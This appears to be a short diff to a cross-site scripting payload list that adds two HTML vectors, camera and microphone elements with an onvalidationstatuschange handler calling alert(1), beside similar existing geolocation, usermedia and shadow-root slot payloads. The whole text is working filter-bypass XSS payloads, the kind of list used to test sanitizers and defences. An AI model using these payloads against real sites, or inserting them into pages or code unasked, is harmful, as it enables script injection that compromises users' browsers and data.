@@ -1025,6 +1025,8 @@ code
 x<template shadowrootmode=open><slot onslotchange=alert(1)>
 <geolocation onvalidationstatuschange=alert(1)>
 <usermedia onvalidationstatuschange=alert(1)>
+<camera onvalidationstatuschange=alert(1)>
+<microphone onvalidationstatuschange=alert(1)>
 <geolocation onpromptdismiss=alert(1)>
 <usermedia onpromptdismiss=alert(1)>
 <geolocation onpromptaction=alert(1)>
